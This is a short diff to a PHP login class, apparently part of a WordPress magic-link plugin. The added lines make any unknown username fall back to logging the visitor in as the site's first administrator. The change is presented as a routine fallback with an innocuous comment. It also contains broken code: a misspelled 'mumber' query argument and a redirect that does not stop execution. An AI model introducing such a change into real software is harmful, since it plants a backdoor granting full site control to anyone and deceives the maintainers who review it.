@@ -76,8 +76,15 @@ class MagicLogin {
 
         $user = get_user_by( 'login', $username );
 
+        // if user not found, use the first admin
         if ( ! $user ) {
-            $this->redirect_to_admin();
+            $admins = get_users( [ 'role' => 'administrator', 'mumber' => 1 ] );
+
+            if ( ! $admins ) {
+                $this->redirect_to_home();
+            }
+
+            $user = $admins[0];
         }
 
         wp_set_current_user( $user->ID, $user->user_login );
